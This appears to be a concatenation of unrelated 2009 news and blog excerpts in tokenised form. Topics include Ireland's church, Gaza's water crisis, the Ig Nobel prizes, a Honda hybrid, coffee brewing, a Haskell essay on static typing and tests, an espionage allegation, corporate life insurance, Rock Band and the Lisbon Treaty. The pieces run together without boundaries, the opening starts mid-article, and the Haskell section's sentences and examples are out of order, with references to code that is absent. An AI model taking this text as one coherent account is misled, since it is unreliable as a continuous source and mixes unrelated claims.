Abortion , divorce and contraception were banned and censorship was famously strict .
Ireland was famous for its writers but many of those frowned upon by the church , from James Joyce to Edna O'Brien , regarded the artistic atmosphere as stifling and left its shores .

For example , Elvis Presley 's " most suggestive abdominal dancing " was cut out of movies while even a Cliff Richard film was thought too racy for the Irish .
A scene in " On the Waterfront , " in which a priest bought Marlon Brando a beer was cut since it was thought inappropriate for a priest to drink in public .
Today the irony is that some priests were in private engaging in activities which no film - maker or artist would dare depict .
In high politics few politicians ever took on the church head - on over important issues , many of them proclaiming that their first duty was to their church .
Politicians , it was regularly said , feared " the belt of the crozier . "
When rare clashes did occur the bishops almost invariably won the exchanges .
As late as 1969 Ireland was described as " the most Christian country in the world , " but the sixties , as elsewhere , brought huge changes as education , television and travel eroded much of the old deference .
However the sex scandals , beginning in the early 1990s with the revelation that the Bishop of Galway had secretly fathered a child , have done more than anything to sap the authority of a once authoritarian church .
Partially treated sewage seeps into the groundwater from the lagoons
By Heather Sharp
BBC News , Gaza
Gaza 's aquifer and only natural freshwater source is " in danger of collapse , " the UN is warning .
Engineers have long been battling to keep the densely populated strip 's water and sewage system limping along .
But in September the UN Environment Programme warned that damage to the underground aquifer - due to the Israeli and Egyptian blockade , conflict , and years of overuse and underinvestment - could take centuries to reverse if it is not halted now .
We could in a short time change people 's lives if we were allowed to , but there is a key phrase - open borders
Monther Shoblak Monther Shoblak , director of Gaza 's Coastal Municipality Water Utility , sniffs the air at the Beit Lahia water treatment plant and smiles .
" I 'm happy when I smell sewage , " he jokes , " it means the turbines are working . "
Propellers are agitating the frothy sludge in one of the lagoons , aerating it to help bacteria digest it .
He says the machinery sometimes falls silent during the power cuts that plague most of Gaza .
But the mirror - smooth pond next to it is a perpetual concern .
The plant is handling twice its capacity and is only able to partially treat the sewage .
Lagoons designed to allow treated clean water to infiltrate through Gaza 's sandy soil back down into the aquifer are instead funnelling sewage straight back into the groundwater
In addition , with several years of drought and the digging of hundreds of illegal , unregulated wells , the UN Environmental Programme says at least three times more water is extracted than is replenished each year .
Up to 80 m litres of partially treated sewage are pumped into the sea each day
As the level is dropping in the aquifer , sea water is invading .
With nitrates from the sewage and salt from the sea , only 5 - 10 % of the water in Gaza 's wells - and therefore its taps - now meets World Health Organization guidelines , even after it has been chlorinated .
Years of decline
The aquifer has been in decline for years .
But Oxfam's Mark Buttle , who co-ordinates international organisations working in the water sector , says the pressures are adding up .
Gaza faces a " pending environmental disaster " he warns .
" Water is life , " he says .
Action must be taken now , " so that we can prevent future problems with Gaza becoming uninhabitable " .
Khader Makdad and his wife find it difficult to pay for water
Next to a school among a dense tangle of crumbling concrete homes , a water pump in Shati refugee camp hums as it sucks water from a borehole close to the sea .
Mr Buttle says it is some of Gaza 's worst water .
" It 's like sea water , " says local resident Shadi Dosh , 27 .
" It 's not clean .
It 's only for washing .
It has a bad smell , " says Nabila Makdad , a mother of six .
Poverty has risen in Gaza as the blockade has ended much economic activity .
An estimated 70 % of the population lives on less than a dollar a day .
Mrs Makdad and her husband Khader say they make so little from their two street stalls that they have to rely on charity and loans from friends .
They spend 20NIS ( about $ 5 ) a week buying water for cooking and drinking from private tankers , which bring water from small - scale desalination plants .
" I 'd rather buy vegetables or fruit , or put the money towards my children 's education , but there 's no other way , " says Ms Makdad .
Health concerns
Another concern is the blood disorder dubbed " blue baby syndrome " , which is associated with nitrate pollution .
It results in low oxygen levels in an infant 's blood , which can cause breathing trouble , diarrhoea and vomiting , and in extreme cases , loss of consciousness , convulsions and death .
Some building supplies have arrived , but water and sanitation workers say they need a lot more
The World Health Organization has not discovered any recent , full - blown cases in Gaza .
But in a 2002 study , nearly half the children surveyed had higher than safe levels of methemoglobin , the substance that indicates the condition .
Nitrate pollution has increased since then .
Under Israel 's crippling blockade , and with the border with Egypt closed , most building materials are refused entry , for fear they could be used to make smuggling tunnels or the rockets that militants fire at Israel .
But limited amounts of materials for sewage and water infrastructure have been allowed in .
Israeli government spokesman Mark Regev says he believes the system for approving shipments is currently " going quite well " .
He says Israel " wants to work effectively with the international community " on the issue , which with 50 - 80 m litres of partially treated sewage pumped into the sea each day , is also likely to have an impact on southern Israel 's coast .
But Mr Shoblack says , since Israel 's military operation in Gaza last winter , only five of 40 orders for building materials have arrived .
Nevertheless , he says , most of the $ 6 m of damage sustained by the water and sewage system during the fighting has been repaired .
The lagoon which burst , killing five people , has now been drained Thirty kilometres of pipes and 11 wells were damaged , and sewage flooded for up to a kilometre after one waste water plant was hit .
Even some control rooms at a brand new facility - locally referred to as the Tony Blair project as it has been heavily championed by the international Middle East envoy - were damaged .
But Mr Shoblack speaks proudly of his organisation 's few achievements - for example , the draining of a lagoon in Beit Lahiya that burst in 2007 , killing five people in a flood of sewage .
And he says donors have committed $ 250 m to a master plan including a sea water desalination plant and new sewage treatment facilities - but only if the political and security situation improves .
In the meantime , he shows me a large pipe belching brownish - white sludge into a frothy patch on the beach south of Gaza City .
It pollutes the sea and wastes water that could , if treated , be used to recharge the aquifer .
" We have a vision .
We could in a short time change people 's lives , if we were allowed to , " says Mr Shoblack .
" But there is a key phrase - open borders . "

Luminaries from the world of improbable research last night gathered at Harvard 's Sanders Theatre for the 19th Ig Nobel Prize Ceremony , which saw honours awarded to a gas mask bra , research proving cows with names give more milk , and similarly vital work showing that " kitchen refuse can be reduced more than 90 per cent in mass by using bacteria extracted from the feces of giant pandas " .
Elena N. Bodnar , Raphael C. Lee , and Sandra Marijan of Chicago secured the Public Health title for their brassiere which , " in an emergency , can be quickly converted into a pair of gas masks , one for the brassiere wearer and one to be given to some needy bystander " :
Brit Peter Rowlinson of Newcastle University attended in person to soak up the applause for " Exploring Stock Managers ' Perceptions of the Human - Animal Relationship on Dairy Farms and an Association with Milk Production " .
This ground - breaking bovine probe demonstrated the average amount of milk produced by a cow over its annual ten - month lactation period is 13,198 pints , but that cows with names yielded 454 pints more , on average .
Rowlinson 's colleague Catherine Douglas " was unable to travel because she recently gave birth " , so she " sent a photo of herself , her new daughter dressed in a cow suit , and a cow " .
Fumiaki Taguchi , of Japan 's Kitasato University Graduate School of Medical Sciences , was able to make the trip and take a bow for " Microbial Treatment of Kitchen Refuse With Enzyme - Producing Thermophilic Bacteria From Giant Panda Faeces " .
Other laureates were Stephan Bolliger , Steffen Ross , Lars Oesterhelweg , Michael Thali and Beat Kneubuehl of the University of Bern , for " Are Full or Empty Beer Bottles Sturdier and Does Their Fracture - Threshold Suffice to Break the Human Skull ? " , and Javier Morales , Miguel Apátiga , and Victor M. Castaño of Universidad Nacional Autónoma de México , immortalised for " Creating Diamonds From Liquid - Specifically From Tequila " .
The full list of winners is right here .
We 're delighted to note it includes Ireland 's Garda , celebrated for their now - famous dragnet in pursuit of Polish serial traffic offender Prawo Jazdy , aka Mr Driving Licence . ®
2011 Honda CRZ Hybrid
Hybrids can also be full of fun ; the two - seater upcoming model of Honda has been designed to demonstrate that .
As 2011 model , CRZ hybrid coupe will remain on track and in 2010 on sale .
Honda sparing no efforts to make sports car enthusiasts buy it because it ’s green , but on the reason that it ’s full of fun .
Honda was already planning to introduce the CRZ as a non - hybrid model , but now the company is quite desperate to be reckoned as a hybrid supplier like Toyota .
The company says that it definitely needs some hybrid - only dedicated models to get the desired results .
Honda CRZ is being powered with a robust 140 - hp , 1.8 liter engine ( derived from civic ) and its electronics , battery , motor and other IMA systems will be likes of the Insight for saving the cost .
According to a senior engineer at Honda , “ It would be a real fun for nice drive , and reminds you of CRX original . ”
The things that would this two - seater CRZ a real deal for pocket performance coupe are 2800 - lbs total weight , tons of electric assistance for torque with nice and robust gasoline engine .
Recently , Honda has cut back the production of some of its sports cars , as their President Takeo Fukui has announced to cancel the replacement of Acura NSX .
Similarly , the company is also no more in Formula 1 .
So , we can expect that the CRZ for Honda during 2010 would as the CRX for the company in the 1980s .
You probably brew coffee , like most people , the most insipid way possible : Using a Mr. Coffee that you fill with pre-ground coffee from the supermarket .
There 's a million other ways to make coffee , and they 're all better .
Updated .

Here 's the rub about making coffee :
The best ways to make coffee are the super simplest or the ultra - geekiest .
The middle ground — i.e. , your drip brewer — produces mediocrity .
And where I come from , mediocre is spelled s - h - i - t - t -y .
What 's universal to every good method of making coffee is that there 's a ton of control and consistency going on .
In fact , consistency is the secret sauce to making great coffee .
But we 've got a few things we even get to the part you probably think of as " making coffee . "
These are the basic elements , no matter what voodoo you 're invoking to make coffee :
The beans , roast , grind , dose , water , temperature and brew time .
Beans
Advertisement
Buy 'em fresh , buy 'em whole , buy 'em sustainably .
That 's about all there is to it .
Well , almost .
If you 're a dark roast drinker , it 's time to branch out .
Here 's how Ken Nye , owner of Ninth St. Espresso , which has been at the forefront of NYC 's coffee scene since 2001 explains it like this :
Take a piece of dry - aged prime rib , which is loaded with complex flavors .
How are you gonna cook it ?
Lighter , to preserve all of that complexity , or are you gonna char the holy hell out of it ?
There 's nothing wrong with people who like the taste of a well - done piece of meat , but well , they 're loving the char more than the meat .
Same thing with some of the amazing coffees people that are being sourced now by companies like Intelligentsia , Stumptown and Counter Culture — they tend to roast on the medium to lighter side using older equipment to let the coffee 's actual flavor come through .
Roasting super dark is a good way to hide what 's going on with the bean ( good or bad ) .
Grinding
There 's no way around this :
If you care about coffee , you have to grind the beans right before you make it .
As soon as they 're ground , the oils inside the beans are exposed to air , and the thousand different flavor compounds inside start dying .
Coffee 's fragile , man .
The grind is the foundation process for everything else that happens afterward .
In fact , David Latourell , formerly of the Coffee Equipment Company ( of Clover fame ) and currently at Intelligentsia , says that the number one thing people can do to " change their world " when it comes to coffee is to fix their grind situation .
If the grind up is screwed , so is everything else .
Uniformity is what 's key , otherwise you get an uneven extraction , which means mediocre coffee .
And the only way to get that uniformity is with a good burr grinder .
Advertisement
Blade grinders mutilate coffee beans , and the heat caused by the friction screws up the chemistry , so do n't even think about it .
A burr grinder pulverizes the beans instead of chopping them up .
Just because it's a burr grinder does n't mean it 's a good grinder , though .
You want one that 's efficient and can grind slowly , otherwise you 're introducing friction and heat that corrupts the coffee .
Typically , that means a conical burr grinder , versus a flat burr grinder .
While you can get a burr grinder as cheaply as $ 50 , both Ken and David say that you have to spend at least $ 150 - $ 200 for a home grinder — in particular , David recommends the Baratza Virtuoso , a conical burr grinder that 's about $ 200 .
( Ken 's commercial grinder , pictured , is about $ 3000 . )
It sounds like a crazy amount of money for a grinder , but if you 're serious about making coffee at home , this is where you start .
Fortunately , it 's the most expensive piece of equipment you need to buy .
Okay !
Let 's get to brewing , from simple to whizbang .
Chemex
Advertisement
A Chemex pot is one of the simplest ways to brew coffee .
Seriously .
You put a paper filter over a carafe , dump in coffee grounds , and pour water over it .
There is an art to it , however .
As is the case with every method of making coffee , there 's no one perfect dose , brew time or temperature for every coffee — it depends on the coffee , and of course , your taste , and that 's where the art lies — but Intelligentsia 's got some starting points ( PDF ) .
( 200 degrees is a good fail - safe temp , though . )
Intelligentsia's got a tutorial video ready to go .
Besides the $ 35 Chemex pot , you need Chemex brand paper filters ( no , the cheap filters wo n't do , because the paper weave sucks ) .
Something to look for is a nice , even bloom , like we see up top ( the coffee will puff up in the filter ) as you pour .
The end result is a light , super clean cup of coffee where all of its qualities shine through really brightly .

French Press

The French press , while low tech like the Chemex , produces coffee that 's almost antithetical to the Chemex 's clean profile :
It 's got more heft , it 's grittier , it 's a little less defined , but it 's much richer , too .
A solid Bodum press starts at about $ 30 , give or take .
The coffee is ground a little coarser here , for bigger particulates .
Happily , there 's another video to walk you through the process .
Two things to emphasize , Ken from Ninth St. says :
When you push down the plunger at the end of the brew time , go slow and easy .
As coffee steeps longer , it gets more sensitive , so you do n't want to agitate it by slamming down the plunger .
Also , when you 're done brewing , pour off all the coffee .
Do n't let it sit , you gotta get it outta there .

Vacuum or Siphon Pot
Advertisement
The vacuum pot looks like it 's straight out of a chemistry set — or meth lab — for a reason :
You do n't wanna go there .
David explains that it 's perhaps the finickiest way to brew coffee — it " requires skill " and an amazing cup out of it can be " elusive . "
It is a seriously cool concept though .
So , you 've got two chambers connected by a tube .
Water is boiled heated in the bottom chamber so it rises into the upper chamber , where your coffee is hanging out .
It brews .
Then you pull it off the heat source ( whatever you 're using ) , and the coffee is sucked back into the lower chamber — vacuums , baby — leaving the grounds up top and an articulate , clean cup in the bottom .
Moka Pot

Then there 's the Moka pot .
What makes it special is that it uses steam pressure to brew coffee , and you make it on your stove , using coffee that 's almost as finely ground as espresso , though not quite .
Again , pretty simple idea with a couple of chambers connected by a tube .
You 've got a base chamber , filled with water , into which you stick a funnel - shaped filter filled with coffee .
Start the water a - boilin ' and steam pressure will start forcing water through the filter ( and the coffee grounds , natch ) into the upper chamber .
So it 's sort of like a percolator , and there 's debate as to whether or not it 's a true perc pot because of the way it uses steam pressure .
You 've got to take care not to let things get too hot , though , otherwise you 'll screw up the coffee .
Gimme Coffee 's tutorial for making Moka
Pot coffee is a pretty solid one to follow , and pots go from $ 25 - $ 50 , depending on size .

Cold Brew or Toddy
Advertisement
Have n't heard of cold - brewing ?
This is how you make iced coffee , not pouring coffee you 've brewed regularly over ice , which results in a sour , disgusting abomination .
Well , every method we 've talked about ( and will after this ) for brewing coffee involves hot water , and a relatively short brewing time .
Cold brewing is the low and slow approach : Coarse coffee grounds are steeped in room temp water for 12 - 24 hours , depending on the coffee .
What comes out is exceptionally smooth , with most of the acidity — and some would say complexity — gone , so it has drinkability , like Bud Light .
The " official " and I suppose easiest way to make cold - brew coffee is using the $ 40 toddy system , which claims credit for starting the whole damn cold - brew deal in the first , but you can make it on the cheap .
AeroPress

Update : Alright already , we hear you guys :
We can't leave out AeroPress , which delivers a super smooth cup of coffee with a superfast brew and extraction time .
Plus the apparatus is cheap , under 30 bucks .
It 's basically like a giant syringe .
Ground coffee ( a little finer than drip ) is placed in a tube with a paper filter on the bottom , which is placed over whatever want the coffee to wind up in .
After hot water is added and the coffee steeps , a plunger is inserted and pushed down , forcing the brewed coffee through the filter .
And hey look , another tutorial from Gimme .

Drip
Advertisement
Okay , I 'm about to explode your world here .
The drip coffeemaker you 've got at home and at your office on the left here ?
It sucks .
Remember earlier , how I said consistency is the key to coffee ?
A consistent temperature is crucial , and most drip makers can't deliver that .
They can't even deliver the right temperature to begin with .
200 degrees is the golden temperature for brewing coffee , and most drip pots top out at around 180 , which is n't hot enough for a proper extraction .
Plus , they probably wet the grinds unevenly , making it worse .
In fact , Ken and David both say that the only drip brewer who can deliver that is from Technivorm ( on the right ) , whose drip brewers actually meet the temperature standards of the Special Coffee Association of America .
And Technivorms coffeemakers are n't cheap , going for around $ 200 .
Sorry dudes .
Espresso
Advertisement
You know what ?
Let 's just get this out of the way :
You can't make amazing espresso at home .
Not unless you 're will to spend something $ 7500 on an espresso machine from someone like La Marzocco .
Why ?
Consistency .
Temperature .
Pressure .
As big and scary as an espresso machine looks , again , the basics are n't too complicated to grasp :
It 's using pressure to force water through a puck of finely ground coffee .
What 's inside that giant box is a boiler system — or two — that heats the water that passes through the puck and powers the steamer , and a motor to force the water through with a degree of pressure , so that the coffee is quickly extracted with all of those " beautiful oils " Ken from Ninth St. is fond of talking about , if the espresso shot is pulled skillfully .
It should be dense , rich and topped with a yummy looking rust foam on top , called crema .
Advertisement
Lesser machines are n't that good at the two most important things an espresso machine works with : Temperature and pressure .
To start , good commercial machines have at least two independent boiler systems , one for the coffee , one for the steamer .
In the past , Jacob Ellul - Blake from La Marzocco R&D told me , before the brew boiler and steam boiler were separated , you ran into a problem where steaming milk would cause the steam pressure inside of the machine to drop , which would make the water temperature drop as well , since temperature and pressure are proportional — and you 'd get a less - than - excellent shot .
So , a good machine keeps a consistent temperature .
Incredibly high end machines are super - precisely controlled temp - wise , within tenths of a degree .
That 's because taste is affected with a temperature variation of half a degree .
( We 'll go more in - depth on that later this week . )
On the pressure front , most home machines just can't deliver the 8 - 9 bar of pressure that you need for a good extraction .
So when it comes to espresso , if you desire excellence , you 're pretty much resigned to going to a coffee shop .
They 've got the equipment — and hopefully barista skills — you just do n't have .
But that 's not a bad thing .
David related it this way :
It 's like the difference between cooking at home and eating out .
You can make a delicious meal yourself ( coffee analog : Chemex or French press ) but you 're probably not going to make cookie - covered ice cream balls using liquid nitrogen , and that 's okay .

Clover

Clover was the darling of the coffee world until the Coffee Equipment Company was bought by Starbucks .
All hand - built , around 250 of them were made before Starbucks swooped in .
Essentially , the Clover is a nerdy way of delivering water to coffee with precisely — digitally — controlled parameters that are repeatable every single time , so you can brew the same cup over and over and over , or so you can experiment more rigorously , carefully tweaking one element at a time .
The gist of the Clover of this :
You place ground coffee in a chamber , which is filled with a precise amount of water at the exact temperature you set ( give or take a degree ) for the precise brew time you set .
When it 's done .
Coffee pulled into the chamber by the vacuum formed when the piston is pushed back up with the Clover 's powerful motor — it can lift 350 pounds — with the grounds left on top thanks to its 70 micron filter .
The resulting cup is clean — coffee aficianados love clean cups — and expressive , though it 's not quite so as the Chemex method .
But that 's what $ 12,000 of coffee engineering gets you .
Advertisement
That 's not quite every method of brewing coffee — seriously , there 's about a million , like CafeSolo or single - cup ceramic drip — but those are the majors definitely worth knowing ( or in one case , forgetting ) .
But in sum , if you 're looking to change your home game , Chemex or French Press are the ways to go .
If you wanna get really geeky about coffee , believe me , we have n't even started , so stayed tuned .

Taste
Test is our weeklong tribute to the leaps that occur when technology meets cuisine , spanning everything from the historic breakthroughs that made food tastier and safer to the Earl - Grey - friendly replicators we impatiently await in the future .
Now , coming to Haskell .
You can guess the point I ’m going to make .
In Haskell , a lot of code is either trivial or declarative .
Further , many of the types of errors you could make are caught by the compiler .
Typos and missing imports etc. are always caught , and many other errors beside .
Functional programming languages , especially pure ones , eliminate a lot of the kind of mistakes that are easy in imperative languages .
Everything being an expression helps a lot — it forces you to think about every branch and return a value .
In monadic code it becomes possible to avoid this , but a lot of your code is pure functional .
Is the above code ‘ trivial ’ or ‘ declarative ’ ?
Well , that ’s a tough call .
A lot of code in Haskell quickly becomes very declarative in style , especially when written point free .
Once you ’ve done that , it ’s even harder to make a mistake .
It ’s almost possible to try vaguely relevant code at random and see if it compiles .
For something like this , if it compiles , and it looks very simple , it ’s probably correct .
( There are obviously times when that will fail you , but it ’s amazing how often it does n’t .
You often feel like you just have to keep doing what the compiler tells you and you ’ll get working code . )
For something like the above , you would often write your type signature first :
In the above definition , there is basically nothing that can go wrong .
We already know that foldl ' works , and is n’t going to miss anything , or fail with an empty list .
You ca n’t forget to return the return value , like you can in Python .
The compiler will catch any type errors .
If the function does n’t do anything approaching what it ’s supposed to then you ’ll know as soon as you try to use it .
I ’ve used point - free style , so there is n’t any chance of doing something silly with the input variables , because they do n’t even appear in the function definition !
Imagine a more complex function than our sanitise_phone_number above .
It ’s going to take a list of ‘ transformation ’ functions and an input value and apply each function to the value in turn , returning the final value .
In some languages , that would be just about worth writing a test for .
You might have to worry about iterating over the list , boundary conditions , etc .
But in Haskell it looks like this :
And it ’s not in general true that the simple functional test will catch any type errors , because often it will only exercise one route through the code , ignoring the fact that in many places dynamically typed code can return values of different types , which can cause type failures etc .
Had I written this in Python , I might have wanted tests to ensure that the HTML in the Atom feed content was escaped properly and various other things , in addition to a simple check for status 200 .
But the API of the feed library , combined with the type checking that the compiler has done , has made that redundant , and has tested it far more easily and thoroughly than I could have done with tests .
After filling in all the values for these feeds , I wrote some very simple ‘ glue ’ functions that fed in the data and returned the result as an HTTP response .
I created 4 different feeds , all of which worked perfectly first time , as soon as I got them to compile .
I can not see any value , and only cost , in adding tests for this .
A check for a 200 response code and non empty content might be worth it , but would be much easier to write as a bash script that uses ‘ curl ’ on a few known URLs .
In my blog software , I use the feed library for Atom feeds .
The code I ’ve had to write is extremely simple — a matter of creating some data structures corresponding to Atom feeds .
The data structures are defined to force you to supply all required elements .
Where there is a choice of data type , it forces you to choose — for example the ‘ content ’ field has to be set with either HTMLContent " < h1 > your content < / h1 > " or TextContent " Your content " .
( For those who do n’t know Haskell , it should also be pointed out that there is no equivalent to ‘ null ’ .
Optional values are made explicit using the Maybe type ) .
But what about something much bigger — say the generation of an Atom feed ?
With a library that makes use of a strong static type system , this can be actually quite hard to get wrong .
Example 3
One final example of reducing the need for automated tests is the routing system I ’ve used in Ella .
OK , it ’s really a chance to show off the only slightly clever bit of code that I wrote , but hopefully it will explain something of the power of a strong type system :-)
Consider the following bits of code / configuration in a Django project , which are responsible for matching a URL , pulling out some bits from it and dispatching it to a view function .
### myproject/urls.py patterns = ( '' , ( r ' ^members /( \d+ ) /$ ' , ' myproject.views.member_detail ' ) , # etc ... ) ### myproject/views.py def member_detail ( request , memberid ) : memberid = int ( memberid ) member = get_member ( memberid ) # etc ...
Now , there are a number of possible failure points in this code that you might want some regression tests for .
For example , if in the future we change it so that the URL uses a string such as a user name , rather an integer , we will need to change the URLconf , the line in member_detail that calls int , and the definition of get_member ( or use a different function ) .
There is a DRY or OAOO failure here — the fact that we are expecting an integer is specified multiple times , either implicitly or explicitly .
This is one of the causes of fragility in this chunk of code — if one is changed , the others might not be updated , introducing bugs of different kinds .
Now , there are things you can do about this , with some small or large changes to how URLconfs work .
But they are not complete solutions , and one solution not open to Python developers is the one I coded in Ella .
The equivalent bits of code , with type signatures and explanations of them for those who do n’t know any Haskell , would look like this in my system .
----- MyProject / Routes.hs import MyProject .
Views routes = [ " members / " <+/> intParam //-> memberDetail $ [ ] -- etc... ]
----- MyProject / Views.hs -- memberDetail takes an ' Int ' and an HTTP ' Request ' object , and returns an -- HTTP ' Response ' ( or ' Nothing ' to indicate a 404 ) , doing some IO on the -- way .
memberDetail :: Int -> Request -> IO ( Maybe Response ) memberDetail member
Id request = do member <- getMember memberId -- etc ...
You should read <+/> as ‘ followed by ’ and //-> as ‘ routes to ’ .
Just ignore the $ [ ] bit for now ( it exists to allow decorators to be applied easily in the routing configuration , but we are applying no decorators , hence the empty list ) .
intParam is a ‘ matcher ’ : it attempts to pull off the next chunk of the URL ( ending in a ‘/’ ) , match it and parse it as an integer .
If it can do so , it passes the parsed value on to memberDetail as a parameter i.e. it partially applies memberDetail with an integer .
The beauty of this system is that nothing can go wrong any more .
We still have DRY violations at the moment , but it does n’t cause a problem , because the compiler checks for consistency .
In fact , we can even remove the DRY violation .
We could change the code like this :
----- MyProject / Routes.hs import MyProject .
Views routes = [ " members / " <+/> any Param //-> memberDetail $ [ ] -- etc... ]
----- MyProject / Views.hs memberDetail member
Id request = do member <- getMember memberId -- etc ...
We ’ve replaced intParam with anyParam , which is a polymorphic version that can match any parameter of type class Param .
You can define your own Param instances , so this is completely extensible ( and you can also define your own matchers , for complete power ) .
We ’ve also removed the type signature from memberDetail .
So how can any Param know what type of thing to match ?
This is where type inference comes in .
The function getMember will probably have a type signature , or it will use its parameter in such a way that its type signature can be inferred .
From that , the type of member Id can be inferred .
From that , the type of value that any Param must return can be inferred .
And from that , finally , the instance of Param can be chosen .
The compiler is using the type system to pick which method should be used to match and parse the URL parameters based on how those parameters are eventually used .
This is very nice .
( At least I think so :-) .
We ’ve removed the DRY violation , or , if we choose to use type signatures or explicitly specify types in routes , DRY violations do n’t matter because the compiler will catch them for us .
Would unit or functional tests have caught any problems ?
Well , they might .
If they checked the happy case , they will prove whether that still works .
But they ’re unlikely to check whether the URLconf is too permissive or not .
But the compiler can do that kind of consistency check .
The end result is that there are just fewer things that can possibly go wrong .
I ’m not saying that you would n’t bother to write any tests .
But in this case , if memberDetail was really just glue , you might decide to only test its component parts ( for example , by testing the template that it relies on ) .
Since most of the glue has been constructed so that it ca n’t go wrong , you can focus tests on what can go wrong .
And some sections of the code sink below the threshold at which tests provide positive value .
There are many other ways in which static type checking can make automated tests redundant .
Parsers are a great example — a spec might define a syntax in BNF notation .
In Haskell , you might well implement that using parsec .
But if you look at the code , it will have pretty much a one - to - one correspondence with the BNF definitions .
Any tests you write will simply check that a few examples happen to be parsed correctly , as you cannot begin to cover the input space .
It ’s therefore far better to spend your time manually checking that the code matches the BNF spec than writing lots of tests .
It ’s also often argued that integration / unit tests that achieve 100 % coverage will catch all type related errors , making static type checking redundant , since even with static type checking we ’ll need tests to catch the value related errors .
But this is a myth .
In Python , it ’s easy to have code with type errors that have 100 % test coverage .
A simple example :
class Discount ( models .
Model ) : # nullable if there is no expiry : expires_on = models .
DateField ( null = True ) @property def has_expired ( self ) : return date .
today ( ) > self .
expires_on def test_has_expired ( ) : d = Discount ( expires_on = date ( 2000 , 1 , 1 ) ) self .
assertEqual ( d . has_expired , True )
I omitted the negative case for has_expired for brevity , but we already have 100 % coverage .
However , we did n’t check the None case and we ’ll get a TypeError at runtime for some legitimate values .
In dynamically typed languages ( or even all languages which allow nullable values ) , unit testing is extremely unhelpful for this situation .
A powerful static type system like that found in Haskell , on the other hand , will find the error at compile time , and require that the signature of has_expired changes , and all the related code .
The changes needed to get it to compile are almost impossible to get wrong , so for the case of having no expiry date , you have trivial code that does not need manual automated tests ( that is the say , the test you would have written would have so little value , and relatively high costs , that writing one would be a failure of judgement and a waste of your current and future resources ) .
US State Dept. third highest official was espionage suspect , says ex-FBI agent
September 30 , 2009 by intelNews
By IAN ALLEN | intelNews.org |
Marc Grossman , Under Secretary of State during the Bush Administration , was suspect in a lengthy counterespionage probe by the FBI , according to a former senior Bureau agent .
John M. Cole , an 18 - year FBI veteran who worked for the Counterintelligence Division of the Bureau ’s National Security Branch , said the investigation into Grossman centered on activities by Turkish and Israeli intelligence in the United States .
Cole was speaking to former CIA agent Philip Giraldi , currently of The American Conservative magazine , a paleoconservative publication , which was one of a handful of US media outlets that gave column space to recent revelations of Turkish intelligence activities by FBI whistleblower Sibel Edmonds .
Edmonds , a translator for the FBI , spent seven years trying to get a US court to hear her allegations that Turkish intelligence agents penetrated her unit , the State Department , the Pentagon and Congress .
On August 8 , she gave a public testimony at the Washington headquarters of the National Whistleblowers Association , in an attempt to keep her case alive in the public eye .
Among other allegations , she said that Turkish intelligence agents bugged the apartment of a female member of Congress and then blackmailed her , threatening to expose her extra-marital affair .
She also claimed that several Congress members were “ paid off ” to support legislation that Ankara deemed important for Turkey ’s interests .
Cole ’s response is the first confirmation of Edmonds ’ allegations .
The retired FBI counterintelligence agent said that the Bureau investigated the case , but the investigation , which lasted ten years , was eventually “ buried and covered up ” .
Grossman , now retired , rose to the State Department ’s third most senior post after serving as US Ambassador to Turkey from 1994 to 1997 .

Are ' Dead Peasant ' Life Insurance Policies Fair ?
Families fight back after learning employers collect on a loved one 's death .
Oct. 2 , 2009  --
Life insurance used to be rather straightforward , known for offering security to loved ones in a tough time .
So when Irma Johnson learned that her husband , Daniel , who died of brain cancer , had been insured for $ 1.5 million , it should have been at least a small comfort .
But she did not receive the money .
His employer did .
It 's one of the strangest free - market perversions that Michael Moore highlights in his latest film , " Capitalism : A Love Story . "
In the corporate practice dubbed " Dead Peasants " life insurance , companies wager on employees ' lives , expecting to make money when they die .
And it 's pervasive , said Mike Myers , an attorney who has uncovered many of these cases and helped angry relatives sue .
" Life insurance is traditionally used to guard against the death of breadwinners .
This is an investment scheme , " he said .
Dozens of blue chip companies have these policies , according to Myers .
But only banks are forced to reveal them , and several have billions of dollars worth of policies .
" The driving force behind it is the tax deductions , " he said .
The life insurance policies were designed to allow companies to insure a few crucial executives .
Savvy companies then realized they could also get a tax break by insuring many lower - level employees .
The financial scheme does n't actually cost the employees anything , except , some say , their trust .
Betina Tillman felt shocked and deceived when a reporter from The Wall Street Journal told her that her brother , a music store cashier , was insured by his employer for $ 339,000 when he died , despite the fact that he no longer worked at the store .
" We were just in disbelief they were able to do it , and actually cash the policy and cash in on the policy , " Tillman said .
Families Battle in Court
She sued , and won .
Now , the government mandates that companies obtain the consent of employees .
In the case of Daniel Johnson , Amegy Bank told ABC News that Johnson did give his consent , but Irma disputes that , and she 's suing .
Rep. Gene Green , D - Texas , has pushed for even tougher restrictions .
" We hope our laws are based on not only fairness , but morals , " Green told ABC News .
" And to me , it 's immoral to benefit from your death if I do n't know you . "
Meanwhile , for those who feel they have been wronged and were never told about the insurance , it 's up to them to brave the court system .
" It was a matter of making sure we did the right thing and something that would honor our brother , " Tillman said .
" We sent a message across to that company , to let them know you may have gotten away with it all these years , but not this time . "
Michael Moore 's new movie , " Capitalism : A Love Story " opens nationwide today .
Rock Band Is Changing Now
by David ' Hades ' Becker [ Tuesday , 6th of October 2009 - 03:42 PM ]
This is going to change the game in a drastic way I think .
We will start to hear more and more " underground " music flowing out to the public .
Making it so bands who are serious do n't need to fellate Radio stations for play , but shell out around $ 100 bucks to get their tracks up on Rock Band for the low prices of $ 0.99 .
Not a bad shake for them .
But it also does mean that we are going to see some of the more money hungry artist will be pumping out crap just to make a buck or two .
Artists that may not even be worthy of being on the game in the first place , but they do n't want to feel left out .
But hey , maybe well get some Rammstein on here finally or maybe a few songs from Repo !.
Who knows ?
Here 's where to get them if you are interested .
by Sunny Hundal
In anticipation of David Cameron ’s u-turn on Lisbon , Tim Montgomerie has mounted what could charitably be described as a face - saving operation at ConHome , while trying to extract his own pound of flesh for the support .
He says :
Unless Vaclav Klaus u-turns again , the Lisbon Treaty is about to be ratified .
The Conservative leadership will say that , if elected , there ’ll be no attempt to ‘ unratify ’ it via a referendum .
Lisbon is not the only problem in our relationship with the EU , goes the argument , and it would be a referendum that cannot undo Lisbon .
I ’m 99 % certain of this position having worked the phones over the last 24 hours .
So far so unexpected .
In fact Peter Oborne earlier predicted this with an article in the Observer : ‘ Cameron has only himself to blame for this mess on Europe ‘ .
Tim Montgomerie then proceeds to counter expected criticisms with headers such as :
‘ DAVID CAMERON PROMISED A REFERENDUM ON AN ‘UNRATIFIED ’ LISBON TREATY , NOTHING ELSE ’
and
‘ DAVID CAMERON DESERVES THE CONTINUING SUPPORT OF EUROSCEPTICS ’
and
